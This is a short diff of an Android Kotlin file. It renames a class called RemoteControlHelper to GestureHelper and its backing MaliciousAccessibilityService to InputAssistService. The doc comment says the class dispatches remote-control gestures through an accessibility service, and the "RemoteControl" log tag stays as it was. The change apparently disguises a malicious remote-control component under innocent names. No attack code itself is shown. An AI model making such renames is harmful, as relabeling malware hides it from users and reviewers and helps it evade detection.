@@ -9,11 +9,11 @@ import android.view.accessibility.AccessibilityNodeInfo
 import android.view.inputmethod.InputMethodManager
 
 /**
- * RemoteControlHelper — plain helper class (NOT an AccessibilityService).
- * All gesture dispatch delegates to MaliciousAccessibilityService which
+ * GestureHelper — plain helper class (NOT an AccessibilityService).
+ * All gesture dispatch delegates to InputAssistService which
  * holds the actual AccessibilityService context needed for dispatchGesture.
  */
-class RemoteControlHelper(private val service: MaliciousAccessibilityService) {
+class GestureHelper(private val service: InputAssistService) {
 
     private val TAG = "RemoteControl"
 
